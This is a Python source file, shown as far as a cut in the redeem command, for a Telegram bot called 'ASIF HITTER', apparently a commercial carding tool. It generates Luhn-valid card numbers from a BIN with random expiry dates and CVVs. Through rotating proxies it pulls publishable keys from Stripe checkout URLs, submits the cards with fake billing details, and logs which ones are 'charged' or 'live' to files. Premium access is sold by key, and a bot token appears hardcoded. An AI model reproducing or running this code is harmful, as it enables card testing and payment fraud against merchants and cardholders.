"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT v3.5 STABLE ⚡
Production Ready | All Errors Fixed | Guaranteed /start Response
Dev: Asif Sakhani (@Asifsakhani786)

FIXES v3.5:
- Added error handler for all commands
- /start guaranteed response (no async file I/O blocking)
- Bot startup logging
- All handlers wrapped in try/except
- Timeout handling for all HTTP requests
- Proper cleanup on shutdown

Required: pip install "python-telegram-bot[job-queue]" aiohttp aiohttp-socks aiofiles
"""

import asyncio
import json
import os
import random
import re
import time
import base64
import sys
import traceback
import logging
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, Dict, Any, List

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ApplicationHandlerStop,
)
from telegram.constants import ParseMode
from telegram.error import TelegramError, NetworkError, TimedOut

# ═══════════════════════════════════════════════════════════
# LOGGING SETUP
# ═══════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8737062520:AAE36kmL7GWHuolYwg1YTxuXb8sd36Fm5PQ")
ADMIN_IDS = [8093002631]  # Replace with your Telegram user ID
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# ═══════════════════════════════════════════════════════════
# PREMIUM EMOJI IDs
# ═══════════════════════════════════════════════════════════

EMOJI = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "🌐": "5447602197439218445",
    "📊": "5445146408153806223", "📦": "5303102515301083665",
    "⏳": "5258113901106580375", "🚀": "4904936030232117798",
    "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249",
    "👤": "5445174334031166029", "🔑": "5454386656628991407",
    "👥": "5454371323595744068", "ℹ️": "5289930378885214069",
    "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔗": "5447479640547428304", "📌": "5447187153274567373",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552", "⛔": "4918014360267260850",
    "🛡": "5219672809936006424", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "🗑": "5305652587708572354", "🟢": "5444987348334965906",
    "🔵": "5258024802010026053", "🟡": "5343927661213279013",
    "🔴": "5447647474984449520", "❤️": "5287446418909328171",
    "🤖": "5219943216781995020", "🎯": "5444987348334965906",
    "⭐️": "5172716095697584957", "💠": "5870498447068502918",
    "🏦": "5445408306669582934", "🔌": "5120722716260828125",
    "🔄": "5454245266305604993", "📄": "5323538339062628165",
    "🛠": "5348239232852836489", "⚙": "5258023599419171861",
}

def e(emoji: str) -> str:
    """Convert emoji to premium animated HTML tag"""
    eid = EMOJI.get(emoji)
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
    return emoji

def ec(emoji: str, count: int = 1) -> str:
    """Repeat emoji count times"""
    return "".join([e(emoji) for _ in range(count)])

def h(text: str) -> str:
    """Escape HTML special characters"""
    if not text:
        return ""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ═══════════════════════════════════════════════════════════
# DATA HELPERS (Synchronous fallback for reliability)
# ═══════════════════════════════════════════════════════════

DATA_DIR = "data"
SETTINGS_FILE = "settings.json"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"

# In-memory cache for instant /start response
_memory_cache = {
    "settings": None,
    "premium_users": {},
    "proxies": {},
    "keys": {},
    "last_load": 0,
}

def _ensure_data_dir():
    os.makedirs(DATA_DIR, exist_ok=True)

def _sync_load_json(path, default=None):
    """Synchronous JSON load — never fails, instant for /start"""
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.loads(f.read() or "{}")
    except Exception as ex:
        logger.error(f"Failed to load {path}: {ex}")
    return default

def _sync_save_json(path, data):
    """Synchronous JSON save"""
    _ensure_data_dir()
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(json.dumps(data, indent=2, default=str))
        return True
    except Exception as ex:
        logger.error(f"Failed to save {path}: {ex}")
        return False

def _refresh_cache():
    """Refresh in-memory cache from files"""
    _memory_cache["settings"] = _sync_load_json(SETTINGS_FILE, {"log_channel": "", "max_proxies": 6, "version": "3.5"})
    _memory_cache["premium_users"] = _sync_load_json(PREMIUM_FILE, {"users": {}})
    _memory_cache["proxies"] = _sync_load_json(PROXY_FILE, {"users": {}})
    _memory_cache["keys"] = _sync_load_json(KEYS_FILE, {"keys": {}})
    _memory_cache["last_load"] = time.time()

# Initial cache load
_refresh_cache()

def get_setting_sync(key, default=None):
    """Get setting from cache — instant, no await needed"""
    if time.time() - _memory_cache["last_load"] > 30:  # Refresh every 30s
        _refresh_cache()
    return _memory_cache["settings"].get(key, default)

def is_premium_sync(uid):
    """Check premium from cache — instant"""
    if time.time() - _memory_cache["last_load"] > 30:
        _refresh_cache()
    u = _memory_cache["premium_users"].get("users", {}).get(str(uid), {})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry", "2000-01-01")):
                return True
        except:
            pass
    return False

def get_user_proxies_sync(uid):
    """Get proxies from cache — instant"""
    if time.time() - _memory_cache["last_load"] > 30:
        _refresh_cache()
    return _memory_cache["proxies"].get("users", {}).get(str(uid), [])

def is_admin(uid):
    return uid in ADMIN_IDS

# Async versions for background operations
async def get_setting(key, default=None):
    return get_setting_sync(key, default)

async def update_setting(key, value):
    s = _sync_load_json(SETTINGS_FILE, {"log_channel": "", "max_proxies": 6, "version": "3.5"})
    s[key] = value
    _sync_save_json(SETTINGS_FILE, s)
    _refresh_cache()

async def is_premium(uid):
    return is_premium_sync(uid)

async def get_user_proxies(uid):
    return get_user_proxies_sync(uid)

async def save_user_proxies(uid, proxies):
    d = _sync_load_json(PROXY_FILE, {"users": {}})
    mp = get_setting_sync("max_proxies", 6)
    d["users"][str(uid)] = proxies[:mp]
    _sync_save_json(PROXY_FILE, d)
    _refresh_cache()

async def jsave_async(path, data):
    _sync_save_json(path, data)
    _refresh_cache()

async def jload_async(path, default=None):
    return _sync_load_json(path, default or {})

# ═══════════════════════════════════════════════════════════
# PROXY SYSTEM
# ═══════════════════════════════════════════════════════════

def parse_proxy_line(line):
    line = line.strip()
    if not line:
        return None
    if "://" in line:
        p = line.lower()
        if any(p.startswith(x) for x in ["http://", "https://", "socks4://", "socks5://"]):
            return line
        return None
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        if port.isdigit() and 1 <= int(port) <= 65535:
            return f"http://{line}"
    elif len(parts) == 4:
        host, port, user, pwd = parts
        if port.isdigit():
            return f"http://{user}:{pwd}@{host}:{port}"
    return None

def get_proxy_config(proxy):
    if not proxy:
        return None, None
    p = proxy.lower()
    if p.startswith("socks4://"):
        hp = proxy.split("://")[1]
        if "@" in hp:
            hp = hp.split("@")[1]
        host, port = hp.rsplit(":", 1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS4, host=host, port=int(port), rdns=True), None
    elif p.startswith("socks5://"):
        hp = proxy.split("://")[1]
        if "@" in hp:
            hp = hp.split("@")[1]
        host, port = hp.rsplit(":", 1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS5, host=host, port=int(port), rdns=True), None
    return None, proxy

async def test_single_proxy(proxy):
    conn, pxy = get_proxy_config(proxy)
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
            t1 = time.time()
            async with s.get("https://api.stripe.com/v1", proxy=pxy, ssl=False) as r:
                ms = int((time.time() - t1) * 1000)
                return True, f"OK {r.status} ({ms}ms)"
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as ex:
        return False, str(ex)[:50]

# ═══════════════════════════════════════════════════════════
# CARD GENERATOR
# ═══════════════════════════════════════════════════════════

def luhn(partial):
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) for i,c in enumerate(t[::-1]))
        if s%10==0:
            return str(d)
    return "0"

def card_len(bin_):
    p2, p3 = bin_[:2], bin_[:3]
    if p2 in ("34","37"): return 15
    if p2 in ("30","36","38") or p3 in ("300","305"): return 14
    return 16

def gen_card(bin_str):
    parts = bin_str.strip().split("|")
    raw = re.sub(r"[^0-9xX]", "", parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = card_len(c)
    if len(c) >= ln: c = c[:ln-1]
    while len(c) < ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year
    mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if card_len(raw) == 15 and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc": c, "mo": mm, "yr": yy, "cv": cvv, "f": f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════════════════════════════════════
# STRIPE CHECKER
# ═══════════════════════════════════════════════════════════

class StripeChecker:
    def __init__(self, url, proxy=None):
        self.url = url
        self.proxy = proxy
        self.pk = None
        self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.site_url = ""
        self.chk = ""
        self.sub = 0

    def _headers(self):
        hdrs = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        if self.pk:
            hdrs["Authorization"] = f"Bearer {self.pk}"
        return hdrs

    async def init(self):
        try:
            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
            if m: self.cs = m.group(0)
            
            if '#' in self.url and not self.pk:
                try:
                    hash_part = self.url.split('#')[1]
                    decoded = base64.b64decode(unquote(hash_part))
                    xored = ''.join(chr(b ^ 5) for b in decoded)
                    pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xored)
                    if pk_match: self.pk = pk_match.group(0)
                    site_match = re.search(r'https?://[^\s\"\<\>\\]+', xored)
                    if site_match: self.site_url = site_match.group(0).rstrip('\\')
                except:
                    pass
            
            if not self.cs:
                return False
            
            conn, pxy = get_proxy_config(self.proxy)
            
            if not self.pk:
                try:
                    async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
                        async with s.get(self.url, headers={"user-agent": "Mozilla/5.0"}, proxy=pxy, ssl=False) as r:
                            html = await r.text()
                            pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
                            if pk_match: self.pk = pk_match.group(0)
                except:
                    pass
            
            if not self.pk:
                return False
            
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=self._headers(),
                    data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=pxy, ssl=False
                ) as r:
                    d = await r.json()
                
                if "error" in d:
                    return False
                
                ac = d.get("account_settings") or {}
                self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
                if not self.site_url:
                    self.site_url = ac.get("statement_descriptor", "") or ""
                
                lg = d.get("line_item_group") or {}
                iv = d.get("invoice") or {}
                pi = d.get("payment_intent") or {}
                am = lg.get("total", 0) or iv.get("total", 0) or pi.get("amount", 0)
                cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
                self.amt_raw = am
                self.amt = f"{am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "0.00 USD")
                self.chk = d.get("init_checksum", "")
                self.sub = lg.get("subtotal", 0) if lg else am
                return True
        except Exception as ex:
            logger.error(f"StripeChecker.init error: {ex}")
            return False

    async def charge(self, card):
        res = {"card": card["f"], "st": "ERROR", "msg": "Unknown error"}
        conn, pxy = get_proxy_config(self.proxy)
        
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=25)) as s:
                hdrs = self._headers()
                
                pmb = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                    f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                    f"&billing_details[name]=John+Smith&billing_details[email]=john@example.com"
                    f"&billing_details[address][country]=US&billing_details[address][line1]=476+West+White+Mountain+Blvd"
                    f"&billing_details[address][city]=Pinetop&billing_details[address][postal_code]=85929"
                    f"&billing_details[address][state]=AZ&key={self.pk}"
                    f"&muid={random.getrandbits(32):08x}&sid={random.getrandbits(32):08x}"
                    f"&payment_user_agent=stripe.js%2Ff5e714652c"
                    f"&time_on_page={random.randint(30000,60000)}&pasted_fields=number"
                )
                
                async with s.post("https://api.stripe.com/v1/payment_methods",
                                  headers=hdrs, data=pmb, proxy=pxy, ssl=False) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    cd = pm["error"].get("decline_code", "")
                    mg = pm["error"].get("message", "")
                    if "unsupported" in mg.lower():
                        res["st"], res["msg"] = "ERROR", f"PK error: {mg[:80]}"
                        return res
                    if cd == "incorrect_cvc" or "security code" in mg.lower():
                        res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg[:80]}"
                    elif cd == "insufficient_funds":
                        res["st"], res["msg"] = "LIVE", f"insufficient_funds - {mg[:80]}"
                    else:
                        res["st"], res["msg"] = "DECLINED", mg[:100]
                    return res
                
                pmid = pm.get("id")
                if not pmid:
                    res["msg"] = "No payment method ID"
                    return res
                
                cfb = (
                    f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                    f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={self.pk}"
                    f"&init_checksum={quote(self.chk)}"
                )
                
                await asyncio.sleep(4.0)
                
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  headers=hdrs, data=cfb, proxy=pxy, ssl=False) as r:
                    cf = await r.json()
                
                if "error" in cf:
                    er = cf["error"]
                    cd = er.get("decline_code", "")
                    mg = er.get("message", "")
                    if "captcha" in mg.lower():
                        res["st"], res["msg"] = "HCAPTCHA", "CAPTCHA_REQUIRED"
                    elif cd in ("challenge_required", "require_action"):
                        res["st"], res["msg"] = "3DS", "3DS Required"
                    elif cd == "incorrect_cvc":
                        res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg[:80]}"
                    elif cd == "insufficient_funds":
                        res["st"], res["msg"] = "LIVE", f"insufficient_funds - {mg[:80]}"
                    else:
                        res["st"], res["msg"] = "DECLINED", f"{cd} - {mg[:80]}" if cd else mg[:100]
                else:
                    pi2 = cf.get("payment_intent") or {}
                    st2 = pi2.get("status", "") or cf.get("status", "")
                    if st2 == "succeeded":
                        res["st"], res["msg"] = "CHARGED", "Payment Successful"
                    elif st2 == "requires_action":
                        res["st"], res["msg"] = "3DS", "3DS Required"
                    else:
                        res["st"], res["msg"] = "ERROR", f"Status: {st2}"
        except asyncio.TimeoutError:
            res["st"], res["msg"] = "ERROR", "Timeout"
        except Exception as ex:
            res["st"], res["msg"] = "ERROR", str(ex)[:80]
        
        return res

# ═══════════════════════════════════════════════════════════
# ERROR HANDLER
# ═══════════════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log all errors"""
    logger.error(f"Update {update} caused error: {context.error}")
    if context.error:
        logger.error(traceback.format_exc())
    
    # Notify user if possible
    if update and hasattr(update, "effective_message") and update.effective_message:
        try:
            await update.effective_message.reply_text(
                f"❌ An error occurred. Please try again later.\n\n"
                f"If this persists, contact @{DEV_USERNAME}",
            )
        except:
            pass

# ═══════════════════════════════════════════════════════════
# COMMAND HANDLERS (All wrapped for safety)
# ═══════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """START COMMAND — Guaranteed response, no async I/O blocking"""
    try:
        uid = update.effective_user.id
        user = update.effective_user
        
        # All data from in-memory cache (instant)
        prem = is_premium_sync(uid)
        adm = is_admin(uid)
        proxies = get_user_proxies_sync(uid)
        mp = get_setting_sync("max_proxies", 6)
        ver = get_setting_sync("version", "3.5")
        
        # Badge
        if adm:
            badge = f"{e('⚡')} {e('👑')} ADMIN"
        elif prem:
            badge = f"{e('👑')} PREMIUM"
        else:
            badge = f"{e('⛔')} FREE"
        
        # Build keyboard
        kb = [
            [InlineKeyboardButton("🌐 Gateway Check", callback_data="gate_help")],
            [InlineKeyboardButton("💳 Hit Checkout", callback_data="hit_help")],
            [InlineKeyboardButton(f"🔐 Proxy Manager ({len(proxies)}/{mp})", callback_data="proxy_menu")],
            [InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_help")],
            [InlineKeyboardButton("👤 My Status", callback_data="status")],
        ]
        if adm:
            kb.append([InlineKeyboardButton("⚡ Admin Panel", callback_data="admin")])
        kb.append([InlineKeyboardButton(f"❤️ Dev: {DEV_NAME}", url=f"https://t.me/{DEV_USERNAME}")])
        
        # Build message
        txt = f"""{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

{e('🤖')} <b>Status:</b> {badge}
{e('💎')} <b>Version:</b> v{ver}
{e('🔐')} <b>Proxies:</b> {len(proxies)}/{mp}

{e('⭐️')} <b>Commands:</b>
{e('🌐')} /gate — Check gateway
{e('💳')} /hit — Hit checkout (Premium)
{e('🔐')} /addproxy — Add proxies
{e('🔍')} /proxy — Check proxies
{e('🗑')} /rmproxy — Remove proxies
{e('🔑')} /redeem — Redeem key
{e('👤')} /status — Premium status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
        await update.message.reply_text(
            txt,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb),
            disable_web_page_preview=True,
        )
        logger.info(f"/start by {user.full_name} ({uid})")
        
    except Exception as ex:
        logger.error(f"/start error: {ex}")
        # Fallback — plain text, no emojis
        try:
            await update.message.reply_text(
                f"🚀 ASIF HITTER v3.5\n\n"
                f"Status: {'ADMIN' if is_admin(update.effective_user.id) else 'ACTIVE'}\n\n"
                f"Commands:\n"
                f"/gate - Check gateway\n"
                f"/hit - Hit checkout\n"
                f"/addproxy - Add proxies\n"
                f"/proxy - Check proxies\n"
                f"/rmproxy - Remove proxies\n"
                f"/redeem - Redeem key\n"
                f"/status - Check status\n\n"
                f"Dev: @{DEV_USERNAME}"
            )
        except:
            pass

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
            return
        
        uid = update.effective_user.id
        proxies = get_user_proxies_sync(uid)
        proxy = random.choice(proxies) if proxies else None
        
        st = await update.message.reply_text(f"{e('⏳')} Fetching gateway info...", parse_mode=ParseMode.HTML)
        
        ck = StripeChecker(ctx.args[0], proxy)
        if await ck.init():
            await st.edit_text(
                f"{e('🌐')} <b>GATEWAY INFO</b>\n\n"
                f"{e('📦')} <b>Merchant:</b> {h(ck.mer)}\n"
                f"{e('💰')} <b>Amount:</b> {h(ck.amt)}\n"
                f"{e('🏦')} <b>Site:</b> {h(ck.site_url or 'N/A')}\n"
                f"{e('🔑')} <b>PK:</b> <code>{h(ck.pk[:30])}...</code>\n"
                f"{e('✅')} Gateway is LIVE",
                parse_mode=ParseMode.HTML
            )
        else:
            await st.edit_text(f"{e('❌')} Failed to init session. Check URL or proxy.", parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/gate error: {ex}")
        await update.message.reply_text(f"❌ Error: {str(ex)[:100]}")

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        adm = is_admin(uid)
        
        if not is_premium_sync(uid) and not adm:
            await update.message.reply_text(
                f"{e('🚫')} <b>ACCESS DENIED</b>\n\n{e('⛔')} Premium feature!\n{e('🔑')} /redeem &lt;key&gt;",
                parse_mode=ParseMode.HTML
            )
            return
        
        if len(ctx.args) < 2:
            await update.message.reply_text(
                f"{e('⚠️')} <code>/hit &lt;url&gt; &lt;bin&gt;</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        url, bin_in = ctx.args[0], ctx.args[1]
        proxies = get_user_proxies_sync(uid)
        
        if not adm and not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies! Use /addproxy first", parse_mode=ParseMode.HTML)
            return
        
        proxy = random.choice(proxies) if proxies else None
        
        st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
        
        ck = StripeChecker(url, proxy)
        if not await ck.init():
            await st.edit_text(f"{e('❌')} <b>Failed!</b> Check URL or proxy.", parse_mode=ParseMode.HTML)
            return
        
        cards = [gen_card(bin_in) for _ in range(10)]
        charged_c, live_c = [], []
        td = dc = hc = er = 0
        result_lines = []
        
        for i, card in enumerate(cards):
            progress = f"""
{e('🚀')} <b>Stripe Checkout Hitter</b>
{e('📦')} <b>{h(ck.mer)}</b> | {e('💰')} <b>{h(ck.amt)}</b>
{e('💳')} BIN: <code>{bin_in[:8]}xxxx</code>

{e('⏳')} <b>{i+1}/10</b>
{e('🎯')} <code>{card['f']}</code>

{e('🟢')} {len(charged_c)} | {e('🔵')} {len(live_c)} | 🟡 {td} | 🔴 {dc}
"""
            try: await st.edit_text(progress, parse_mode=ParseMode.HTML)
            except: pass
            
            r = await ck.charge(card)
            sts = r["st"]
            
            if sts == "CHARGED":
                charged_c.append(r["card"])
                result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('🟢')} Charged ✅\n<b>Response:</b> {h(r['msg'])}")
            elif sts == "LIVE":
                live_c.append(r["card"])
                result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('🔵')} Live CVC\n<b>Response:</b> {h(r['msg'])}")
                dc += 1
            elif sts == "3DS":
                td += 1
                result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> 🟡 3DS\n<b>Response:</b> {h(r['msg'])}")
            elif sts == "HCAPTCHA":
                hc += 1
                result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> {e('⛔')} Captcha\n<b>Response:</b> {h(r['msg'])}")
            elif sts == "DECLINED":
                dc += 1
                result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> 🔴 Failed ❌\n<b>Response:</b> {h(r['msg'])}")
            else:
                er += 1
                result_lines.append(f"<b>CC:</b> <code>{r['card']}</code>\n<b>Status:</b> ⚪ Error\n<b>Response:</b> {h(r['msg'])}")
            
            await asyncio.sleep(4.0)
        
        final = f"""{e('👑')} <b>STRIPE CHECKOUT HITTER</b> {e('👑')}

{e('📦')} <b>{h(ck.mer)}</b>
{e('💰')} <b>{h(ck.amt)}</b>
{e('💳')} BIN: <code>{bin_in[:8]}xxxx</code>

"""
        for line in result_lines:
            final += f"\n{line}\n{e('─'*20)}\n"
        
        final += f"""
{e('🏦')} Site: {h(ck.mer)} ({h(ck.site_url or 'N/A')})
{e('💰')} Amount: {h(ck.amt)}

{e('📊')} <b>SUMMARY:</b>
{e('🟢')} Charged: <b>{len(charged_c)}</b>
{e('🔵')} Live: <b>{len(live_c)}</b>
🟡 3DS: <b>{td}</b>
🔴 Failed: <b>{dc}</b>
{e('⛔')} Captcha: <b>{hc}</b>
⚪ Error: <b>{er}</b>

{e('❤️')} <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
        await st.edit_text(final, parse_mode=ParseMode.HTML)
        
        # Save results
        _ensure_data_dir()
        if charged_c:
            with open(f"{DATA_DIR}/charged.txt", "a") as f:
                f.write("\n".join(charged_c) + "\n")
        if live_c:
            with open(f"{DATA_DIR}/live.txt", "a") as f:
                f.write("\n".join(live_c) + "\n")
                
    except Exception as ex:
        logger.error(f"/hit error: {ex}")
        await update.message.reply_text(f"❌ Error: {str(ex)[:100]}")

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        msg = update.message
        
        content = ""
        if msg.document:
            f = await msg.document.get_file()
            fb = await f.download_as_bytearray()
            content = fb.decode("utf-8", errors="ignore")
        elif msg.text:
            content = msg.text.replace("/addproxy", "").strip()
        else:
            await msg.reply_text(f"{e('❌')} Send proxy list or .txt file\n{e('ℹ️')} <code>ip:port</code> | <code>http://ip:port</code> | <code>socks5://ip:port</code>", parse_mode=ParseMode.HTML)
            return
        
        all_lines = [l.strip() for l in content.split("\n") if l.strip()]
        if not all_lines:
            await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
            return
        
        valid = []
        for line in all_lines:
            p = parse_proxy_line(line)
            if p: valid.append(p)
        
        if not valid:
            await msg.reply_text(f"{e('❌')} 0 valid out of {len(all_lines)}", parse_mode=ParseMode.HTML)
            return
        
        current = get_user_proxies_sync(uid)
        mp = get_setting_sync("max_proxies", 6)
        slots = mp - len(current)
        
        if slots <= 0:
            await msg.reply_text(f"{e('⛔')} Limit ({mp}) reached. /rmproxy first", parse_mode=ParseMode.HTML)
            return
        
        st = await msg.reply_text(f"{e('⏳')} Checking {len(valid)} proxies...", parse_mode=ParseMode.HTML)
        
        added = 0
        for proxy in valid[:slots*2]:
            if added >= slots: break
            is_live, _ = await test_single_proxy(proxy)
            if is_live and proxy not in current:
                current.append(proxy)
                added += 1
            
            try:
                await st.edit_text(f"{e('⏳')} Checking...\n{e('🟢')} Saved: {added}/{slots}", parse_mode=ParseMode.HTML)
            except: pass
            await asyncio.sleep(0.5)
        
        await save_user_proxies(uid, current)
        await st.edit_text(
            f"{e('✅')} <b>Done!</b>\n{e('🟢')} Saved: <b>{added}</b>\n"
            f"{e('📊')} Total: <b>{len(current)}/{mp}</b>",
            parse_mode=ParseMode.HTML
        )
    except Exception as ex:
        logger.error(f"/addproxy error: {ex}")
        await update.message.reply_text(f"❌ Error: {str(ex)[:100]}")

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        proxies = get_user_proxies_sync(uid)
        if not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies. /addproxy", parse_mode=ParseMode.HTML)
            return
        
        st = await update.message.reply_text(f"{e('⏳')} Checking...", parse_mode=ParseMode.HTML)
        alive, dead = [], []
        
        for p in proxies:
            is_live, info = await test_single_proxy(p)
            if is_live: alive.append(f"{e('✅')} <code>{h(p[:50])}</code>")
            else: dead.append(f"{e('❌')} <code>{h(p[:45])}</code>")
            await asyncio.sleep(0.3)
        
        txt = f"{e('📡')} <b>PROXY STATUS</b>\n\n{e('🟢')} Alive: {len(alive)}\n{e('🔴')} Dead: {len(dead)}\n\n"
        if alive: txt += "\n".join(alive[:15])
        await st.edit_text(txt[:4000], parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/proxy error: {ex}")
        await update.message.reply_text(f"❌ Error: {str(ex)[:100]}")

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        cur = get_user_proxies_sync(uid)
        if not cur:
            await update.message.reply_text(f"{e('❌')} No proxies", parse_mode=ParseMode.HTML)
            return
        
        if ctx.args:
            a = ctx.args[0]
            if a.lower() == "all":
                await save_user_proxies(uid, [])
                await update.message.reply_text(f"{e('✅')} All removed!", parse_mode=ParseMode.HTML)
                return
            try:
                idx = int(a)-1
                if 0 <= idx < len(cur):
                    cur.pop(idx)
                    await save_user_proxies(uid, cur)
                    await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)
                else:
                    await update.message.reply_text(f"{e('❌')} 1-{len(cur)}", parse_mode=ParseMode.HTML)
            except:
                await update.message.reply_text(f"{e('❌')} /rmproxy 1", parse_mode=ParseMode.HTML)
        else:
            txt = f"{e('🗑')} <b>REMOVE</b>\n\n"
            for i,p in enumerate(cur,1):
                txt += f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
            txt += f"\n<code>/rmproxy 1</code> or <code>/rmproxy all</code>"
            await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
    except Exception as ex:
        logger.error(f"/rmproxy error: {ex}")

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        
        if is_premium_sync(uid):
            await update.message.reply_text(f"{e('⛔')} <b>ALREADY PREMIUM</b>", parse_mode=ParseMode.HTML)
            return
        
